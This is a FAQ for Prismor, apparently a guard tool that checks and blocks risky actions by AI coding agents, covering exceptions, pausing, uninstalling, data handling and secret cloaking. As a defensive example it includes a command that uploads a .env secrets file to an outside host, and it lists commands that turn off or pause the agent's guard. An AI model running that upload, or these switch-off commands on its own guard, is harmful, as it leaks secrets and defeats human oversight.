# FAQ and troubleshooting

Short answers to the questions people ask most, with the exact commands. For
the words used here, see the [Glossary](glossary.md). For every command, see
the [CLI reference](cli-reference.md).

Most commands below change Prismor's own settings. Run them yourself in a
terminal. If an agent tries to run them, Prismor blocks it on purpose, so a
tricked agent cannot switch its own protection off.

## Why was my command blocked?

A rule matched the action and that rule is set to block. The block message
names the rule and prints the command that makes an exception for it.

To see why something would be blocked, without running it:

```bash
prismor check "curl -F f=@.env https://example.com" --explain
```

To look back at what happened:

```bash
prismor sessions --findings-only   # runs that had findings, riskiest first
prismor session <id>               # every step of one run, and which rules fired
prismor trail show --last 20       # the most recent recorded actions and verdicts
```

The **Sessions** page of the dashboard (`prismor dashboard`) shows the same
thing with a timeline.

## How do I allow something that was blocked?

Use `prismor allow` with the rule's id. Start with the narrowest option.

```bash
prismor allow secret-exfiltration --pattern 'curl -F f=@.env'   # just this one case
prismor allow secret-exfiltration --observe                     # keep the rule, stop it blocking
prismor allow secret-exfiltration --off --yes                   # turn the rule off in this project
```

With no `--pattern`, `allow` uses the text of the most recent block for that
rule. Add `--expires 30m` to make an exception that runs out on its own.

```bash
prismor allow --list                              # exceptions you have added
prismor allow --undo allow-secret-exfiltration    # remove one
```

Some things cannot be allowed this way:

- **Self-protection rules** always block. They stop the agent from editing
  Prismor itself.
- **Safety floor rules** can be narrowed, but not turned off.
- **Org-managed projects** follow your organization's signed policy. Ask an
  admin instead: `prismor exempt request --reason "why you need it"`.

If the block was about a website the agent tried to reach, add that host to
the allowed list:

```bash
prismor egress allow api.example.com --reason "vendor API for this project"
```

More: [Making exceptions](cli-reference.md#making-exceptions) and
[Network isolation](network-isolation.md).

## How do I turn Prismor off for a while?

Pause it. Pausing stops blocking but keeps checking and recording, so your
history has no gaps.

```bash
prismor pause                                     # stop blocking for 24 hours
prismor pause --for 2h --reason "release hotfix"  # pick the length
prismor pause-hard                                # stop blocking until you resume
prismor resume                                    # start blocking again
```

`pause` turns itself off after 24 hours (or the `--for` time), even if you
forget. `prismor status` shows `Paused: yes` while a pause is on.

To stop Prismor watching one agent completely, remove that agent's hooks:

```bash
prismor uninstall-hooks --agent codex
```

On an org-managed machine, an admin can also pause or resume it, and an admin
pause cannot be lifted with `prismor resume`. See
[Pause and resume](pause-and-login.md).

## How do I uninstall Prismor?

First remove the hooks from every agent, so nothing calls Prismor any more:

```bash
prismor uninstall-hooks --agent all
```

If you installed at user level rather than per project, add the same scope you
used, for example `--scope user`. For Claude Code this also removes the
secret-cloaking hooks.

If you turned on the MCP mirror or the MCP gateway, undo those too:

```bash
prismor mirror off
prismor mcp-gateway uninstall
```

Then remove the package. For a pip install, that is the standard pip command
(the Prismor docs do not describe this step, so this is general pip usage):

```bash
pip uninstall prismor
```

Uninstalling does not delete your recorded history or settings. See
[How do I delete my data?](#how-do-i-delete-my-data).

## What data leaves my machine?

On a normal install, your agent activity does not leave your machine. Sessions,
findings and the audit trail are stored locally, and the dashboard only listens
on `127.0.0.1`.

A few things do make network requests:

- **Update check.** Prismor asks PyPI for the latest version at most once a
  day. Set `PRISMOR_NO_UPDATE_CHECK=1` to stop it.
- **Dashboard assets.** Your browser loads a chart library from a CDN and
  fonts from Google Fonts. Your data is not sent with them.
- **Cost prices.** To estimate token cost, Prismor downloads a public price
  list at most every 12 hours. Set `PRISMOR_PRICING_OFFLINE=1` to never fetch.
- **The AI judge, if you set one up.** If you choose a model to double-check
  uncertain cases (your Claude or Codex login, an API key, or the Prismor
  hosted judge), the text being judged is sent to that model. Choose
  "heuristics only" in `prismor setup` to keep it local. See
  [Semantic Guard](semantic-guard.md).
- **Dependency checks.** `prismor deps` looks up package versions on OSV.dev.
  `prismor deps --offline` skips that.
- **Sinks you configure.** If you add a telemetry sink (a SIEM, a log
  collector), findings are sent there. See [Telemetry sinks](telemetry-sinks.md).

If you connect to an organization (`prismor enroll` or `prismor login`),
**org-managed** projects send redacted telemetry to the control plane: rule
ids, severity, verdicts, agent names and short hashes. By default it never
sends commands, command output, file paths, URLs, file contents, prompts or
responses. Personal projects send nothing. An admin can turn on fuller capture
for an organization; if they do, `prismor enroll-status` shows `capture: FULL`.
Details: [Connecting to the platform](connecting-to-the-platform.md#3-redacted-telemetry-what-leaves-the-box)
and [Telemetry receipts](telemetry-receipts.md).

To disconnect from an organization:

```bash
prismor logout
```

Local protection stays on after logout.

## How do I delete my data?

There is no single "delete my data" command that we could find. Prismor's data
is ordinary files, so you delete them by hand. The default locations are:

| What | Where |
|---|---|
| Session history (shared by all projects) | `~/.prismor/prismor.db` |
| Signed audit trail | `~/.prismor/audit/` |
| Per-session logs in a project | `<project>/.prismor/sessions/` |
| Older per-project history | `<project>/.prismor/prismor.db`, `~/.prismor/workspaces/` |
| Cloaked secrets | `~/.prismor/secrets/` |
| Org connection (device identity) | `~/.prismor/identity.json` |

If you set `PRISMOR_HOME`, replace `~/.prismor` with that folder.

Be careful with two things:

- `<project>/.prismor/policy.yaml` is your rules for that project, not
  history. Keep it if you still use Prismor there.
- `~/.prismor/secrets/` holds the real values behind your cloaked secrets.
  Delete it only if you have those keys somewhere else.

To remove the org connection the supported way, use `prismor logout`. It
deletes the device identity and the cached org policy for you.

See [Dashboard: where the data lives](dashboard.md#where-the-data-lives) and
[Query your data](query-your-data.md#where-the-store-is).

## How do I hide my API keys and secrets from the agent?

Use **cloak**. You store a secret once under a name, and the agent only ever
sees a placeholder like `@@SECRET:stripe_key@@`. The real value is swapped in
at the last moment when a command runs, and scrubbed out of the output.

```bash
prismor cloak install                  # turn on the cloaking hooks
prismor cloak add stripe_key           # you are prompted for the value
prismor cloak add --env-file .env      # import every KEY=VALUE from a .env file
prismor cloak list                     # names only, never values
prismor cloak status
```

If you paste a secret into the chat by accident, Prismor catches it, stores it,
and blocks that prompt once. Send a follow-up such as `go` and the cleaned
version goes through.

Codex cannot swap values in by itself. Run commands that use a placeholder
through Prismor:

```bash
prismor cloak run -- <command>
```

To clean up secrets that already leaked into AI tool files on disk:

```bash
prismor sweep --redact
```

Cloak does not work on native Windows yet; use WSL or Git Bash. More:
[Sweep and Cloak](sweep-and-cloak.md).

## The dashboard is slow or shows "–"

A dash means there is no number to show yet. Common reasons:

- **The page is still loading.** Wait a moment, then click **Refresh** at the
  top of the dashboard.
- **There is no activity yet.** Hooks only see sessions that start after they
  are installed. Run `prismor status` to check the hooks are in place, use
  your agent, then refresh. To fill in older history, run
  `prismor analyze-history --since 90d`.
- **Nothing in the time window.** Many cards only count the selected period
  (for example "last 7 days"). Older activity is not counted there.
- **Cost columns.** `cost=?` means there is no agent transcript on this
  machine to read usage from. `—` means the model has no known price.

The first time the dashboard finds older per-project history, it merges it
into the shared store, so that first load can take longer than usual.
If it stays slow, the terminal view shows the same headline numbers:

```bash
prismor status --all
```

We could not find any other documented tuning for dashboard speed.

## Is my agent being watched? Which agents are covered?

Check this machine:

```bash
prismor status       # this project: hooks, mode, latest session
prismor surfaces     # every agent, and what (if anything) is watching it
prismor discover agents   # agents on this machine that Prismor does not cover
```

Hooks can be installed for Claude Code, Codex, Cursor, Windsurf, Copilot,
Gemini CLI, OpenClaw, Hermes, Grok, Kiro, Crush, OpenHands, Qwen Code, Continue,
Goose, OpenCode and Antigravity. Add one with:

```bash
prismor install-hooks --agent cursor
```

Things that can leave an agent unwatched:

- **Codex hooks not trusted yet.** Open `codex` once in the project and accept
  the hook-trust prompt. `prismor status` and `prismor doctor` warn about this.
- **Activity from before you installed.** Hooks only see new sessions.
- **An agent with no hook support.** The [MCP mirror](mcp-gateway.md) or the
  [LLM proxy](llm-proxy.md) can cover some of these. See
  [Governance surfaces](governance-surfaces.md).

`prismor doctor` runs a fuller health check of the hook setup.

## What do observe and enforce mean?

- **Observe**: Prismor checks and records every action and reports anything
  risky, but blocks nothing.
- **Enforce**: Prismor also stops the actions that match rules you chose to
  block.

You can set the mode for the whole project, or for one agent on the
dashboard's **Agents** page (or with `prismor agents set <name> --mode observe`).
To see what a stricter setup would block before turning it on:

```bash
prismor mode apply dev-safe --observe
```

Prismor's self-protection rules block in every mode. See [Modes](modes.md).

## A hook is slow or timing out

Prismor runs before every tool call, so a slow check slows the agent. Find out
where the time goes:

```bash
prismor status --perf    # timing of recent hook calls, slowest steps and rules
prismor doctor           # checks the hook setup itself
```

The usual cause is the AI judge (the model that double-checks uncertain
cases). You can cap how long it may take per call in `.prismor/policy.yaml`.
When it runs over, the faster built-in check decides instead:

```yaml
settings:
  semantic_guard:
    budget_ms: 1500
```

Or turn the model off and use only the built-in checks:

```yaml
settings:
  semantic_guard:
    mode: heuristic
```

If the hooks and the `prismor` you run in your terminal are different versions,
`prismor doctor` warns and prints the command to upgrade the hooks' copy.

On some agents a hook that times out or crashes lets the action through rather
than blocking it (this is the agent's behaviour, not Prismor's). See
[Agent integrations](../AGENT_INTEGRATIONS.md) and
[Semantic Guard](semantic-guard.md).

## How do I update Prismor?

```bash
prismor update --check   # is there a newer version?
prismor update           # install it
```

`prismor update` upgrades the pip package for the Python it runs from, then
refreshes the guidance it wrote for your agents. Restart your shell or agent
afterwards.

If you installed from a git checkout, the docs do not describe an update
command for that path.
